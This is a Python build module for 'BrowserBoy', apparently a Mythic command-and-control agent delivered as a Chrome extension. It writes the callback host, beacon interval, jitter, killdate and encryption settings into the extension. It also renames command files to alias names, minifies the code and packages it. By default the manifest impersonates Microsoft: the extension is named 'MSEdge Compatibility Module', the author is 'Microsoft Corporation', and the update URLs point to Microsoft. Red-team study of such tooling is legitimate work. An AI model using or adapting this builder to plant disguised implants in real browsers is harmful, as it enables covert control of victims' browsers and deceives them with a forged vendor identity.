"""Build helpers for the BrowserBoy Chrome extension.

This module stays free of mythic_container so unit tests can import it.
Minify uses rjsmin.
"""

from __future__ import annotations

import json
import re
import shutil
import zipfile
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

from .aliases import KNOWN_COMMANDS, WIRE_COMMANDS

CONFIG_MARKER = "__BROWSERBOY_CONFIG__"
COMMAND_IMPORTS_MARKER = "/* __BROWSERBOY_COMMAND_IMPORTS__ */"
COMMAND_EXPORTS_MARKER = "/* __BROWSERBOY_COMMAND_EXPORTS__ */"

PLACEHOLDER_NAME = "__EXTENSION_NAME__"
PLACEHOLDER_SHORT_NAME = "__EXTENSION_SHORT_NAME__"
PLACEHOLDER_DESCRIPTION = "__EXTENSION_DESCRIPTION__"
PLACEHOLDER_VERSION = "__EXTENSION_VERSION__"
PLACEHOLDER_AUTHOR = "__EXTENSION_AUTHOR__"
PLACEHOLDER_HOMEPAGE = "__EXTENSION_HOMEPAGE_URL__"
PLACEHOLDER_UPDATE = "__EXTENSION_UPDATE_URL__"

DEFAULT_EXTENSION_NAME = "MSEdge Compatibility Module"
DEFAULT_EXTENSION_SHORT_NAME = "EdgeCompat"
DEFAULT_EXTENSION_DESCRIPTION = (
    "Provides compatibility components for Microsoft Edge and Chromium-based browsers."
)
DEFAULT_EXTENSION_AUTHOR = "Microsoft Corporation"
DEFAULT_HOMEPAGE_URL = "https://www.microsoft.com/edge"
DEFAULT_UPDATE_URL = "https://edge.microsoft.com/extensions/update.xml"

PNG_MAGIC = b"\x89PNG\r\n\x1a\n"

def normalize_uri(path: str) -> str:
    if not path:
        return "/"
    return path if path.startswith("/") else f"/{path}"


def parse_callback_host(raw_host: str, ssl_flag: Any) -> tuple[str, bool]:
    """Return (hostname, ssl).

    Mythic stores the scheme in callback_host (http://host) or as a bare host.
    A port in callback_host is invalid for the http profile. This function
    does not parse ports.
    """
    host = (raw_host or "").strip()
    ssl = _as_bool(ssl_flag)
    if host.startswith("https://"):
        parsed = urlparse(host)
        return parsed.hostname or host[len("https://") :], True
    if host.startswith("http://"):
        parsed = urlparse(host)
        return parsed.hostname or host[len("http://") :], False
    return host, ssl


def _as_bool(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    if value is None:
        return False
    return str(value).strip().lower() in {"1", "true", "t", "yes", "y"}


def aespsk_mode(aespsk: Any) -> str:
    if isinstance(aespsk, dict):
        value = aespsk.get("value", "none")
    else:
        value = aespsk
    if value in (None, "", "none"):
        return "none"
    return str(value)


def build_agent_config(
    payload_uuid: str,
    c2_params: dict[str, Any],
    *,
    extension_name: str = "browserboy",
) -> dict[str, Any]:
    host, ssl = parse_callback_host(
        str(c2_params.get("callback_host", "")),
        c2_params.get("use_ssl", c2_params.get("USE_SSL", False)),
    )

    headers = c2_params.get("headers", {})
    if not isinstance(headers, dict):
        headers = {}

    interval = c2_params.get("callback_interval", 10)
    jitter = c2_params.get("callback_jitter", 10)
    port = c2_params.get("callback_port", 80)

    return {
        "payload_uuid": payload_uuid,
        "callback_host": host,
        "callback_port": int(port) if str(port).isdigit() else port,
        "ssl": ssl,
        "get_uri": normalize_uri(str(c2_params.get("get_uri", "/index"))),
        "post_uri": normalize_uri(str(c2_params.get("post_uri", "/data"))),
        "query_path_name": str(c2_params.get("query_path_name", "q")),
        "headers": headers,
        "callback_interval": int(interval) if str(interval).isdigit() else interval,
        "callback_jitter": int(jitter) if str(jitter).isdigit() else jitter,
        "killdate": str(c2_params.get("killdate", "")),
        "aespsk": aespsk_mode(c2_params.get("AESPSK", "none")),
        "extension_name": extension_name,
    }


def render_command_registry(command_names: list[str]) -> tuple[str, str]:
    imports: list[str] = []
    exports: list[str] = []
    for name in command_names:
        if name not in WIRE_COMMANDS:
            raise RuntimeError(f"no wire name for command {name!r}")
        alias = WIRE_COMMANDS[name]
        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", alias):
            raise RuntimeError(f"wire name is not a JS identifier: {alias!r}")
        imports.append(f'import {{ run as {alias} }} from "../commands/{alias}.js";')
        exports.append(alias)
    export_block = ",\n  ".join(exports)
    if export_block:
        export_block = f"{export_block},"
    return "\n".join(imports), export_block


def stamp_text(template: str, replacements: dict[str, str]) -> str:
    out = template
    for key, value in replacements.items():
        out = out.replace(key, value)
    return out


def minify_js(source: str) -> str:
    """Minify one ES module. Fails loud if rjsmin is missing."""
    try:
        import rjsmin
    except ImportError as exc:
        raise RuntimeError("rjsmin is required to minify extension JavaScript") from exc
    return rjsmin.jsmin(source, keep_bang_comments=False)


def validate_png(data: bytes) -> None:
    if not data or not data.startswith(PNG_MAGIC):
        raise ValueError("extension icon must be a PNG file")


def _rename_command_files(dest_dir: Path, command_names: list[str]) -> None:
    commands_dir = dest_dir / "commands"
    if not commands_dir.is_dir():
        return
    selected = set(command_names)
    for path in list(commands_dir.glob("*.js")):
        if path.stem not in selected:
            path.unlink()
            continue
        alias = WIRE_COMMANDS[path.stem]
        target = commands_dir / f"{alias}.js"
        if target == path:
            continue
        if target.exists():
            raise RuntimeError(f"command alias collision at {target.name}")
        path.rename(target)


def write_extension_icon(extension_dir: Path, icon_png: bytes) -> None:
    validate_png(icon_png)
    icon_path = extension_dir / "icons" / "icon128.png"
    icon_path.parent.mkdir(parents=True, exist_ok=True)
    icon_path.write_bytes(icon_png)


def minify_extension_js(extension_dir: Path) -> int:
    count = 0
    for path in sorted(extension_dir.rglob("*.js")):
        original = path.read_text(encoding="utf-8")
        path.write_text(minify_js(original), encoding="utf-8")
        count += 1
    return count


def stamp_extension(
    source_dir: Path,
    dest_dir: Path,
    *,
    config: dict[str, Any],
    manifest_fields: dict[str, str],
    command_names: list[str],
    minify: bool = True,
    icon_png: bytes | None = None,
) -> None:
    if dest_dir.exists():
        shutil.rmtree(dest_dir)
    shutil.copytree(source_dir, dest_dir)

    aliases_path = dest_dir / "lib" / "aliases.js"
    if aliases_path.exists():
        aliases_path.unlink()
    _rename_command_files(dest_dir, command_names)

    config_path = dest_dir / "lib" / "config.js"
    config_path.write_text(
        stamp_text(
            config_path.read_text(encoding="utf-8"),
            {CONFIG_MARKER: json.dumps(config, indent=2)},
        ),
        encoding="utf-8",
    )

    imports, exports = render_command_registry(command_names)
    registry_path = dest_dir / "lib" / "commands.js"
    registry_path.write_text(
        stamp_text(
            registry_path.read_text(encoding="utf-8"),
            {
                COMMAND_IMPORTS_MARKER: imports,
                COMMAND_EXPORTS_MARKER: exports,
            },
        ),
        encoding="utf-8",
    )

    manifest_path = dest_dir / "manifest.json"
    manifest_path.write_text(
        stamp_text(
            manifest_path.read_text(encoding="utf-8"),
            {
                PLACEHOLDER_NAME: manifest_fields["name"],
                PLACEHOLDER_SHORT_NAME: manifest_fields.get(
                    "short_name", DEFAULT_EXTENSION_SHORT_NAME
                ),
                PLACEHOLDER_DESCRIPTION: manifest_fields["description"],
                PLACEHOLDER_VERSION: manifest_fields["version"],
                PLACEHOLDER_AUTHOR: manifest_fields.get(
                    "author", DEFAULT_EXTENSION_AUTHOR
                ),
                PLACEHOLDER_HOMEPAGE: manifest_fields["homepage_url"],
                PLACEHOLDER_UPDATE: manifest_fields["update_url"],
            },
        ),
        encoding="utf-8",
    )

    if icon_png is not None:
        write_extension_icon(dest_dir, icon_png)

    if minify:
        minify_extension_js(dest_dir)


def zip_extension(extension_dir: Path, zip_path: Path) -> None:
    if zip_path.exists():
        zip_path.unlink()
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for path in sorted(extension_dir.rglob("*")):
            if path.is_file():
                archive.write(path, path.relative_to(extension_dir))
